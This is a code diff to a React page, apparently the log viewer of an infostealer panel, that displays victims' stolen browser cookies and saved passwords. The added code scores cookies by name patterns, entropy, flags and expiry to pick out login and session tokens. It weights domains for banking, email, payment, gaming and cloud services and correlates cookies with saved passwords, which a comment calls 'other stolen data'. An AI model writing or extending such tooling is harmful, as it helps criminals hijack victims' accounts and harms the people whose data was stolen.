@@ -603,8 +603,8 @@ const LogDetailPage = () => {
             return { date: null, isExpired: false, dateString: 'Session Cookie' };
         }
         
-        try {
-            let expiresDate: Date;
+            try {
+                let expiresDate;
             
             // Check if it's a Unix timestamp (seconds) - Firefox format
             if (expires < 1000000000000) {
@@ -644,44 +644,200 @@ const LogDetailPage = () => {
         }
     };
 
+    // Helper function to calculate entropy (randomness) of a string
+    // High entropy suggests random tokens/session IDs
+    const calculateEntropy = (str) => {
+        if (!str || str.length === 0) return 0;
+        const freq = {};
+        for (let i = 0; i < str.length; i++) {
+            const char = str[i];
+            freq[char] = (freq[char] || 0) + 1;
+        }
+        let entropy = 0;
+        for (const count of Object.values(freq)) {
+            const p = count / str.length;
+            entropy -= p * Math.log2(p);
+        }
+        return entropy;
+    };
+
+    // Helper function to check if domain has saved passwords (correlation)
+    const hasSavedPasswordForDomain = (domain, savedPasswords) => {
+        if (!savedPasswords || !Array.isArray(savedPasswords)) return false;
+        const domainLower = domain.toLowerCase();
+        return savedPasswords.some(pwd => {
+            if (!pwd.origin) return false;
+            try {
+                const url = new URL(pwd.origin);
+                return url.hostname.toLowerCase().includes(domainLower) || 
+                       domainLower.includes(url.hostname.toLowerCase());
+            } catch (e) {
+                // If URL parsing fails, do simple string matching
+                return pwd.origin.toLowerCase().includes(domainLower) ||
+                       domainLower.includes(pwd.origin.toLowerCase());
+            }
+        });
+    };
+
     // Helper function to detect if a cookie is a login/authentication cookie
-    const isLoginCookie = (cookie) => {
+    // Uses multiple heuristics to determine likelihood
+    const isLoginCookie = (cookie, savedPasswords = null) => {
         const cookieName = (cookie.name || '').toLowerCase();
         const cookieHost = ((cookie.host || cookie.domain || '')).toLowerCase();
+        const cookiePath = (cookie.path || '').toLowerCase();
+        const cookieValue = (cookie.value || '');
         
-        // Common login/authentication cookie name patterns
+        let score = 0;
+        const THRESHOLD = 2; // Minimum score to be considered a login cookie
+        
+        // 1. Cookie name patterns (strong signal)
         const loginPatterns = [
-            'session', 'auth', 'token', 'login', 'access', 'refresh', 
-            'jwt', 'bearer', 'oauth', 'sso', 'identity', 'credential',
-            'authentication', 'authorization', 'csrf', 'xsrf', 'sid',
-            'remember', 'rememberme', 'logged', 'userid', 'username',
-            'password', 'passwd', 'apikey', 'apisecret', 'secret',
-            'sessionid', 'session_id', 'sessid', 'sess', 'ses'
+            // Session IDs
+            'session', 'sessionid', 'session_id', 'sessid', 'sess', 'ses', 'sid',
+            // Auth tokens
+            'auth', 'token', 'access', 'refresh', 'jwt', 'bearer', 'oauth',
+            // Login-related
+            'login', 'logged', 'loggedin', 'loginstatus',
+            // Identity/SSO
+            'sso', 'identity', 'credential', 'authentication', 'authorization',
+            // CSRF protection (often on login pages)
+            'csrf', 'xsrf', 'csrftoken', 'xsrftoken',
+            // Remember me
+            'remember', 'rememberme', 'remember_me', 'remember-me',
+            // User identifiers
+            'userid', 'user_id', 'username', 'user', 'uid',
+            // API keys
+            'apikey', 'api_key', 'apisecret', 'api_secret', 'secret',
+            // Other common patterns
+            'passwd', 'password', 'pwd', 'pass',
+            // Platform-specific
+            'aws-session', 'aws-sig', 'cloudfront-signature',
+            'laravel_session', 'django_session', 'phpsessid', 'jsessionid',
+            'asp.net_sessionid', 'cfid', 'cftoken',
+            // Framework & middleware
+            'connect.sid', 'session_key', 'session_token', 'auth_token',
+            'remember_token', 'user_session',
+            // OAuth / OIDC / federation
+            'idtoken', 'id_token', 'accesstoken', 'access_token',
+            'refreshtoken', 'refresh_token', 'state', 'nonce', 'sub',
+            // Account / identity state
+            'account', 'acct', 'profile', 'principal', 'identity_id',
+            // Persistent / keep-alive semantics
+            'keepalive', 'stayloggedin', 'persist', 'persistent',
+            // Load balancer / edge session affinity
+            'route', 'sticky', 'affinity', 'balancer', 'lb',
+            // SPA / API auth context
+            'clientid', 'client_id', 'scope', 'roles', 'permissions'
         ];
         
-        // Check if cookie name contains any login pattern
+        // Check for prefix patterns first (browser-enforced auth prefixes)
+        const prefixPatterns = ['__host-', '__secure-'];
+        const hasPrefix = prefixPatterns.some(prefix => cookieName.startsWith(prefix));
+        
+        // Check for other patterns
         const nameMatches = loginPatterns.some(pattern => cookieName.includes(pattern));
         
-        // Check for common authentication domains
+        if (hasPrefix || nameMatches) score += 2;
+        
+        // High entropy values (random-looking strings) suggest tokens/session IDs
+        if (cookieValue.length > 20) {
+            const entropy = calculateEntropy(cookieValue);
+            if (entropy > 4.0) { // High entropy threshold
+                score += 1;
+            }
+        }
+        
+        // 2. Domain reputation (account-based services, email, social, cloud)
         const authDomains = [
-            'auth', 'login', 'account', 'identity', 'sso', 'oauth',
-            'discord.com', 'github.com', 'google.com', 'facebook.com',
-            'twitter.com', 'microsoft.com', 'apple.com', 'amazon.com',
-            'paypal.com', 'steamcommunity.com', 'epicgames.com'
+            // Authentication services
+            'auth', 'login', 'account', 'identity', 'sso', 'oauth', 'signin', 'sign-in',
+            // Email providers
+            'gmail.com', 'outlook.com', 'yahoo.com', 'protonmail.com', 'mail.com',
+            // Social networks
+            'discord.com', 'github.com', 'facebook.com', 'twitter.com', 'x.com',
+            'instagram.com', 'linkedin.com', 'reddit.com', 'tiktok.com', 'snapchat.com',
+            // Cloud/Enterprise
+            'google.com', 'microsoft.com', 'apple.com', 'amazon.com', 'aws.amazon.com',
+            'azure.com', 'cloudflare.com', 'okta.com', 'auth0.com',
+            // E-commerce/Payment
+            'paypal.com', 'stripe.com', 'shopify.com', 'ebay.com',
+            // Gaming
+            'steamcommunity.com', 'steampowered.com', 'epicgames.com', 'xbox.com',
+            'playstation.com', 'nintendo.com', 'battle.net', 'riotgames.com',
+            // Streaming
+            'netflix.com', 'spotify.com', 'hulu.com', 'disney.com', 'hbo.com',
+            // Development/Code
+            'gitlab.com', 'bitbucket.org', 'stackoverflow.com',
+            // Banking/Financial (be careful with these)
+            'bank', 'banking', 'chase.com', 'wellsfargo.com', 'bankofamerica.com',
+            // Other common services
+            'dropbox.com', 'onedrive.com', 'icloud.com', 'notion.so', 'slack.com',
+            'zoom.us', 'teams.microsoft.com'
         ];
         
         const domainMatches = authDomains.some(domain => cookieHost.includes(domain));
+        if (domainMatches) score += 2;
         
-        // Session cookies (no expiration) with HttpOnly are often login cookies
+        // 3. Flags that imply authentication
+        const isHttpOnly = (cookie.httpOnly || cookie.isHttpOnly) === true;
+        const isSecure = (cookie.secure || cookie.isSecure) === true;
+        const sameSite = (cookie.sameSite || cookie.same_site || '').toLowerCase();
+        
+        if (isHttpOnly) score += 1; // HttpOnly is common for session cookies
+        if (isSecure) score += 0.5; // Secure flag is good practice
+        if (sameSite === 'none') score += 0.5; // Often used for cross-domain auth
+        
+        // 4. Expiration behavior
         const expires = cookie.expires || cookie.expires_utc || cookie.expirationDate || cookie.expiry;
         const isSessionCookie = !expires || expires === 0;
-        const isHttpOnly = (cookie.httpOnly || cookie.isHttpOnly) === true;
         
-        return nameMatches || domainMatches || (isSessionCookie && isHttpOnly);
+        if (isSessionCookie && isHttpOnly) {
+            score += 1.5; // Session cookies with HttpOnly are very likely auth
+        } else if (isSessionCookie) {
+            score += 0.5; // Session cookies without HttpOnly are less certain
+        } else if (expires) {
+            // Check if it's a "remember me" token (long-lived, 30+ days)
+            try {
+                let expiresDate;
+                if (expires < 1000000000000) {
+                    expiresDate = new Date(expires * 1000);
+                } else if (expires < 1000000000000000) {
+                    expiresDate = new Date(expires);
+                } else {
+                    const WINDOWS_EPOCH_DIFF_MS = 11644473600000;
+                    expiresDate = new Date((expires / 1000000) - WINDOWS_EPOCH_DIFF_MS);
+                }
+                if (!isNaN(expiresDate.getTime())) {
+                    const daysUntilExpiry = (expiresDate.getTime() - Date.now()) / (1000 * 60 * 60 * 24);
+                    if (daysUntilExpiry > 30) {
+                        score += 0.5; // Long-lived cookies might be "remember me" tokens
+                    }
+                }
+            } catch (e) {
+                // Ignore parsing errors
+            }
+        }
+        
+        // 5. Path and scope (auth-related paths)
+        const authPaths = [
+            '/account', '/auth', '/login', '/signin', '/sign-in', '/api/auth',
+            '/api/login', '/api/session', '/api/token', '/oauth', '/sso',
+            '/identity', '/user', '/profile', '/dashboard'
+        ];
+        
+        const pathMatches = authPaths.some(path => cookiePath.includes(path));
+        if (pathMatches) score += 1;
+        
+        // 6. Correlation with other stolen data (saved passwords)
+        if (savedPasswords && hasSavedPasswordForDomain(cookieHost, savedPasswords)) {
+            score += 1.5; // Strong correlation if saved password exists for same domain
+        }
+        
+        return score >= THRESHOLD;
     };
 
     // Process and separate cookies into login and regular
-    const processCookies = (cookies) => {
+    const processCookies = (cookies, savedPasswords = null) => {
         if (!cookies) {
             return { loginCookies: [], regularCookies: [] };
         }
@@ -734,15 +890,17 @@ const LogDetailPage = () => {
             );
         }
 
-        // Separate into login and regular
-        const loginCookies = filteredCookies.filter(c => isLoginCookie(c));
-        const regularCookies = filteredCookies.filter(c => !isLoginCookie(c));
+        // Separate into login and regular using enhanced detection
+        const loginCookies = filteredCookies.filter(c => isLoginCookie(c, savedPasswords));
+        const regularCookies = filteredCookies.filter(c => !isLoginCookie(c, savedPasswords));
 
         return { loginCookies, regularCookies };
     };
 
     const renderLoginCookies = (cookies) => {
-        const { loginCookies } = processCookies(cookies);
+        // Get saved passwords from pcData for correlation
+        const savedPasswords = logData?.pcData?.savedPasswords || null;
+        const { loginCookies } = processCookies(cookies, savedPasswords);
 
         if (loginCookies.length === 0) {
             return <Typography sx={{ p: 2, color: '#94a3b8' }}>No login cookies found.</Typography>;
@@ -752,7 +910,9 @@ const LogDetailPage = () => {
     };
 
     const renderRegularCookies = (cookies) => {
-        const { regularCookies } = processCookies(cookies);
+        // Get saved passwords from pcData for correlation
+        const savedPasswords = logData?.pcData?.savedPasswords || null;
+        const { regularCookies } = processCookies(cookies, savedPasswords);
 
         if (regularCookies.length === 0) {
             return <Typography sx={{ p: 2, color: '#94a3b8' }}>No regular cookies found.</Typography>;
@@ -1365,7 +1525,9 @@ const LogDetailPage = () => {
                     return 0;
                 })();
                 
-                const { loginCookies, regularCookies } = processCookies(pcData.browserCookies);
+                // Pass saved passwords for correlation analysis
+                const savedPasswords = pcData.savedPasswords || null;
+                const { loginCookies, regularCookies } = processCookies(pcData.browserCookies, savedPasswords);
                 
                 return (
                     <>
